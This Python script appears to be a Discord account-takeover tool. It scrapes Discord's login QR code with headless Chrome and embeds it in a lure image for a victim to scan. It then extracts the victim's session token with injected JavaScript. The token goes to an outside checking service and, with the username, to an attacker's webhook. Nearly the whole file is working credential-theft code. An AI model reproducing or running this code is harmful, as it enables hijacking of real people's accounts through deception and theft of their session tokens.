from bs4 import BeautifulSoup
from selenium import webdriver
import base64, pyfiglet, time, requests, os
from discord import Webhook, RequestsWebhookAdapter

web_hook_url = "YOUR HOOK URL HERE"

print(pyfiglet.figlet_format("moom825"))
token = ""
WINDOW_SIZE = "0,0"
options = webdriver.ChromeOptions()
options.add_argument("--headless")
options.add_argument("--window-size=%s" % WINDOW_SIZE)
options.add_experimental_option('excludeSwitches', ['enable-logging'])
options.add_experimental_option('detach', True)
driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe')
driver.get('https://discord.com/login')
print("setting up the QR code")
time.sleep(2)
page_source = driver.page_source
soup = BeautifulSoup(page_source, features='lxml')
classe = soup.find('div', {'class': 'qrCode-2R7t9S'})
qrcode = classe.find('img')['src']
imgbase64 = base64.b64decode(qrcode.replace('data:image/png;base64,', ''))
with open('temp23.png','wb') as f:
    f.write(imgbase64)
face = Image.open(r'temp\overlay.png')
img_qr_big = Image.open(r'temp23.png').convert('RGB')
os.system("del temp23.png /f>nul")
pos = ((img_qr_big.size[0] - face.size[0]) // 2, (img_qr_big.size[1] - face.size[1]) // 2)
img_qr_big.paste(face, pos)
im1 = Image.open('temp/template.png', 'r')
im1.paste(img_qr_big, (120, 409))
print("Saving...")
ine = input("what would you like to name your picture?(eg: savepicture (dont give extension)): ")
time.sleep(1)
im1.save(ine + ".png")
cururl = driver.current_url
print("waiting for user to scan...")
while 1 == 1:
    if driver.current_url != cururl:
        token = driver.execute_script('''
        var req = webpackJsonp.push([
            [], {
                extra_id: (e, t, r) => e.exports = r
            },
            [
                ["extra_id"]
            ]
        ]);
        for (let e in req.c)
            if (req.c.hasOwnProperty(e)) {
                let t = req.c[e].exports;
                if (t && t.__esModule && t.default)
                    for (let e in t.default) "getToken" === e && (gotem = t.default.getToken())
            }
        return gotem;''')
        driver.close()
        break
print("User scanned QR code...")
#TWQkd29tRA9vZKFnaO5odyT0eHlrPDB0sKWuAKmstGC0dPNvIZVpZKFkb2JpJGdyeG8yCTBceYNbf3KkAKKvvGivtqy5IYpnIZRwbOZwbeYhYPRscqo=
print("Sending to Webhook...")
if re.search("[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", token) == None:
    print("invalid token? (didnt match regex)")

check = requests.post('https://utilities.tk/tokens/check', json={'token':token})

if check.status_code == 401:
    print('Account invalid.')
elif check.status_code == 403:
    a = check.json()['username']
    print(f"Account locked. `{a}`")
elif check.status_code == 200:
    a = check.json()['username']
    print(f"Account valid! `{a}`")

Webhook.from_url(web_hook_url, adapter=RequestsWebhookAdapter()).send("Token: \n" + token + "\n\nUsername: \n" + a)
print("Thank you for using")
